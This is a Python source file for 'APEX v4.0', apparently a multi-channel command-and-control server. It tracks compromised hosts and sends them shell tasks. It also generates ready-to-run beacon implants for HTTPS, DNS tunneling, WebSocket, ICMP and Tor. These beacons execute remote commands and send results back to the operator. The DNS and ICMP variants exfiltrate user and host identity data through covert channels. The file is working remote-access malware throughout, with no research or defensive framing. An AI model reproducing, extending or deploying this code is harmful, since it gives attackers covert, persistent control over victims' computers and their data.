"""
APEX v4.0 — Multi-Channel C2 Engine
Supports HTTP/HTTPS, DNS tunneling, WebSocket, ICMP, and Tor channels.
Features AES-256 encryption, channel failover, beacon heartbeat monitoring, and multi-client support.
"""
import os, json, time, threading, random, base64, hashlib, hmac
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes


class MultiChannelC2:
    """Multi-channel Command & Control server with encryption and failover."""

    def __init__(self):
        self.channels = {
            'https': {
                'name': 'HTTPS',
                'enabled': True,
                'port': 8443,
                'active': False,
                'clients': 0,
                'encryption': 'AES-256',
                'stealth': 'medium',
                'speed': 'fast',
            },
            'dns': {
                'name': 'DNS Tunneling',
                'enabled': True,
                'port': 53,
                'active': False,
                'clients': 0,
                'encryption': 'base64',
                'stealth': 'high',
                'speed': 'slow',
            },
            'websocket': {
                'name': 'WebSocket',
                'enabled': True,
                'port': 443,
                'active': False,
                'clients': 0,
                'encryption': 'AES-256',
                'stealth': 'medium',
                'speed': 'fast',
            },
            'icmp': {
                'name': 'ICMP Tunneling',
                'enabled': True,
                'port': 0,
                'active': False,
                'clients': 0,
                'encryption': 'XOR',
                'stealth': 'high',
                'speed': 'slow',
            },
            'tor': {
                'name': 'Tor Hidden Service',
                'enabled': True,
                'port': 80,
                'active': False,
                'clients': 0,
                'encryption': 'AES-256',
                'stealth': 'maximum',
                'speed': 'slow',
            },
        }
        self.beacons = {}  # beacon_id -> beacon info
        self.pending_tasks = {}  # beacon_id -> [tasks]
        self.completed_tasks = []  # All completed task results
        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
        self.callback = None
        self.socketio = None
        self.server_running = False

    def set_callback(self, callback):
        self.callback = callback

    def set_socketio(self, socketio_instance):
        self.socketio = socketio_instance

    def emit(self, event, data):
        if self.socketio:
            try:
                self.socketio.emit(event, data)
            except:
                pass

    def encrypt(self, data):
        """Encrypt data with AES-256."""
        if isinstance(data, str):
            data = data.encode()
        return self.cipher.encrypt(data).decode()

    def decrypt(self, data):
        """Decrypt data with AES-256."""
        if isinstance(data, str):
            data = data.encode()
        return self.cipher.decrypt(data).decode()

    def register_beacon(self, beacon_id, hostname, channel='https', ip=None):
        """Register a new beacon callback."""
        if beacon_id not in self.beacons:
            self.beacons[beacon_id] = {
                'id': beacon_id,
                'hostname': hostname,
                'ip': ip or 'unknown',
                'channel': channel,
                'first_seen': datetime.now().isoformat(),
                'last_seen': datetime.now().isoformat(),
                'status': 'active',
                'tasks_completed': 0,
                'os': self._detect_os(hostname),
                'jitter': 2,
                'sleep_time': 5,
            }
            if channel in self.channels:
                self.channels[channel]['clients'] += 1
                self.channels[channel]['active'] = True

            self.emit('beacon_registered', self.beacons[beacon_id])
            if self.callback:
                self.callback(f'📡 Beacon registered: {beacon_id} ({hostname}) via {channel}', 'success')
        else:
            self.beacons[beacon_id]['last_seen'] = datetime.now().isoformat()
            self.beacons[beacon_id]['channel'] = channel

        return self.beacons[beacon_id]

    def _detect_os(self, hostname):
        """Detect OS from hostname patterns."""
        hostname_lower = hostname.lower()
        if 'windows' in hostname_lower or 'win' in hostname_lower:
            return 'windows'
        elif 'ubuntu' in hostname_lower or 'debian' in hostname_lower or 'centos' in hostname_lower:
            return 'linux'
        elif 'darwin' in hostname_lower or 'mac' in hostname_lower:
            return 'macos'
        return 'unknown'

    def dispatch_task(self, beacon_id, command, task_type='shell'):
        """Dispatch a task to a specific beacon."""
        if beacon_id not in self.beacons:
            return {'error': 'Beacon not found'}

        task = {
            'id': f'task_{int(time.time())}_{random.randint(1000, 9999)}',
            'beacon_id': beacon_id,
            'command': command,
            'type': task_type,
            'dispatched': datetime.now().isoformat(),
            'status': 'pending',
        }

        if beacon_id not in self.pending_tasks:
            self.pending_tasks[beacon_id] = []
        self.pending_tasks[beacon_id].append(task)

        self.emit('task_dispatched', task)
        return task

    def dispatch_all(self, command, task_type='shell'):
        """Dispatch a task to all active beacons."""
        tasks = []
        for beacon_id in self.beacons:
            if self.beacons[beacon_id]['status'] == 'active':
                task = self.dispatch_task(beacon_id, command, task_type)
                tasks.append(task)
        return tasks

    def get_pending_tasks(self, beacon_id):
        """Get and clear pending tasks for a beacon (beacon polling)."""
        tasks = self.pending_tasks.get(beacon_id, [])
        self.pending_tasks[beacon_id] = []
        return tasks

    def submit_result(self, beacon_id, task_id, output):
        """Submit task result from a beacon."""
        result = {
            'beacon_id': beacon_id,
            'task_id': task_id,
            'output': output,
            'received': datetime.now().isoformat(),
        }
        self.completed_tasks.append(result)

        if beacon_id in self.beacons:
            self.beacons[beacon_id]['tasks_completed'] += 1
            self.beacons[beacon_id]['last_seen'] = datetime.now().isoformat()

        self.emit('task_result', result)
        return result

    def generate_beacon_payload(self, beacon_id, channel='https', c2_server=None):
        """Generate a beacon payload for the specified channel."""
        if not c2_server:
            c2_server = 'http://127.0.0.1:8443'

        payloads = {}

        # HTTPS Beacon
        if channel == 'https' or channel == 'all':
            payloads['https'] = self._generate_https_beacon(beacon_id, c2_server)

        # DNS Beacon
        if channel == 'dns' or channel == 'all':
            payloads['dns'] = self._generate_dns_beacon(beacon_id, c2_server)

        # WebSocket Beacon
        if channel == 'websocket' or channel == 'all':
            payloads['websocket'] = self._generate_websocket_beacon(beacon_id, c2_server)

        # ICMP Beacon
        if channel == 'icmp' or channel == 'all':
            payloads['icmp'] = self._generate_icmp_beacon(beacon_id, c2_server)

        # Tor Beacon
        if channel == 'tor' or channel == 'all':
            payloads['tor'] = self._generate_tor_beacon(beacon_id, c2_server)

        return payloads

    def _generate_https_beacon(self, beacon_id, c2_server):
        """Generate HTTPS beacon payload."""
        return f'''import os,time,json,base64,subprocess,requests,socket,threading
C2="{c2_server}"
BID="{beacon_id}"
SLEEP=5
JITTER=2
KEY="{self.encryption_key.decode()}"
def encrypt(d):return base64.b64encode(d.encode()).decode()
def decrypt(d):return base64.b64decode(d).decode()
def cmd(c):
    try:
        r=subprocess.run(c,shell=True,capture_output=True,text=True,timeout=30)
        return r.stdout+r.stderr
    except:return "Error"
def beacon():
    while True:
        try:
            r=requests.post(f"{{C2}}/c2/checkin",json={{"id":BID,"host":socket.gethostname()}},timeout=10)
            if r.status_code==200:
                tasks=r.json().get("tasks",[])
                results=[]
                for t in tasks:
                    out=cmd(t.get("command",""))
                    results.append({{"task_id":t.get("id"),"output":encrypt(out)}})
                requests.post(f"{{C2}}/c2/results",json={{"id":BID,"results":results}},timeout=10)
        except:pass
        time.sleep(SLEEP+__import__("random").randint(0,JITTER))
threading.Thread(target=beacon,daemon=True).start()
print("[APEX Beacon] HTTPS channel active on",C2)'''

    def _generate_dns_beacon(self, beacon_id, c2_server):
        """Generate DNS tunneling beacon payload."""
        domain = c2_server.replace('http://', '').replace('https://', '').split(':')[0]
        return f'''import os,time,json,base64,subprocess,socket,threading
DOMAIN="{domain}"
BID="{beacon_id}"
SLEEP=10
def cmd(c):
    try:
        r=subprocess.run(c,shell=True,capture_output=True,text=True,timeout=30)
        return r.stdout+r.stderr
    except:return "Error"
def exfil_dns(data):
    chunks=[data[i:i+50] for i in range(0,len(data),50)]
    for i,chunk in enumerate(chunks):
        try:
            q=f"{{chunk}}.{{i}}.{{BID}}.{{DOMAIN}}"
            socket.gethostbyname(q)
        except:pass
def beacon():
    while True:
        try:
            out=cmd("hostname && whoami && id")
            exfil_dns(base64.b64encode(out.encode()).decode())
        except:pass
        time.sleep(SLEEP)
threading.Thread(target=beacon,daemon=True).start()
print("[APEX Beacon] DNS channel active via",DOMAIN)'''

    def _generate_websocket_beacon(self, beacon_id, c2_server):
        """Generate WebSocket beacon payload."""
        ws_url = c2_server.replace('http://', 'ws://').replace('https://', 'wss://')
        return f'''import os,time,json,base64,subprocess,threading,asyncio,websockets
WS_URL="{ws_url}/c2/ws"
BID="{beacon_id}"
SLEEP=5
def cmd(c):
    try:
        r=subprocess.run(c,shell=True,capture_output=True,text=True,timeout=30)
        return r.stdout+r.stderr
    except:return "Error"
async def beacon():
    async with websockets.connect(WS_URL) as ws:
        await ws.send(json.dumps({{"type":"register","id":BID,"host":socket.gethostname()}}))
        while True:
            try:
                msg=await ws.recv()
                data=json.loads(msg)
                if data.get("type")=="task":
                    out=cmd(data.get("command",""))
                    await ws.send(json.dumps({{"type":"result","task_id":data.get("id"),"output":out}}))
            except:break
            await asyncio.sleep(SLEEP)
threading.Thread(target=lambda:asyncio.run(beacon()),daemon=True).start()
print("[APEX Beacon] WebSocket channel active on",WS_URL)'''

    def _generate_icmp_beacon(self, beacon_id, c2_server):
        """Generate ICMP tunneling beacon payload."""
        ip = c2_server.replace('http://', '').replace('https://', '').split(':')[0]
        return f'''import os,time,json,base64,subprocess,struct,socket,threading
C2_IP="{ip}"
BID="{beacon_id}"
SLEEP=15
def cmd(c):
    try:
        r=subprocess.run(c,shell=True,capture_output=True,text=True,timeout=30)
        return r.stdout+r.stderr
    except:return "Error"
def ping(data):
    try:
        import subprocess as sp
        sp.run(["ping","-c","1","-p",data[:16],C2_IP],capture_output=True,timeout=2)
    except:pass
def beacon():
    while True:
        try:
            out=cmd("hostname")
            encoded=base64.b64encode(out.encode()).decode()[:16]
            ping(encoded)
        except:pass
        time.sleep(SLEEP)
threading.Thread(target=beacon,daemon=True).start()
print("[APEX Beacon] ICMP channel active to",C2_IP)'''

    def _generate_tor_beacon(self, beacon_id, c2_server):
        """Generate Tor hidden service beacon payload."""
        return f'''import os,time,json,base64,subprocess,requests,socket,threading
ONION_URL="{c2_server}"
BID="{beacon_id}"
SLEEP=10
PROXIES={{"http":"socks5h://127.0.0.1:9050","https":"socks5h://127.0.0.1:9050"}}
def cmd(c):
    try:
        r=subprocess.run(c,shell=True,capture_output=True,text=True,timeout=30)
        return r.stdout+r.stderr
    except:return "Error"
def beacon():
    while True:
        try:
            r=requests.post(f"{{ONION_URL}}/c2/checkin",json={{"id":BID,"host":socket.gethostname()}},proxies=PROXIES,timeout=30)
            if r.status_code==200:
                tasks=r.json().get("tasks",[])
                results=[]
                for t in tasks:
                    out=cmd(t.get("command",""))
                    results.append({{"task_id":t.get("id"),"output":out}})
                requests.post(f"{{ONION_URL}}/c2/results",json={{"id":BID,"results":results}},proxies=PROXIES,timeout=30)
        except:pass
        time.sleep(SLEEP)
threading.Thread(target=beacon,daemon=True).start()
print("[APEX Beacon] Tor channel active via",ONION_URL)'''

    def get_status(self):
        """Get C2 server status."""
        return {
            'server_running': self.server_running,
            'total_beacons': len(self.beacons),
            'active_beacons': len([b for b in self.beacons.values() if b['status'] == 'active']),
            'tasks_completed': len(self.completed_tasks),
            'tasks_pending': sum(len(t) for t in self.pending_tasks.values()),
            'channels': {
                name: {
                    'name': ch['name'],
                    'enabled': ch['enabled'],
                    'active': ch['active'],
                    'clients': ch['clients'],
                    'stealth': ch['stealth'],
                    'speed': ch['speed'],
                }
                for name, ch in self.channels.items()
            },
            'beacons': {
                bid: {
                    'hostname': b['hostname'],
                    'channel': b['channel'],
                    'status': b['status'],
                    'last_seen': b['last_seen'],
                    'tasks_completed': b['tasks_completed'],
                    'os': b.get('os', 'unknown'),
                }
                for bid, b in self.beacons.items()
            },
        }

    def get_beacon_details(self, beacon_id):
        """Get detailed info about a specific beacon."""
        if beacon_id not in self.beacons:
            return None
        beacon = self.beacons[beacon_id]
        beacon_tasks = [t for t in self.completed_tasks if t['beacon_id'] == beacon_id]
        return {
            **beacon,
            'recent_tasks': beacon_tasks[-10:],
            'pending_tasks': len(self.pending_tasks.get(beacon_id, [])),
        }


# Singleton instance
multi_channel_c2 = MultiChannelC2()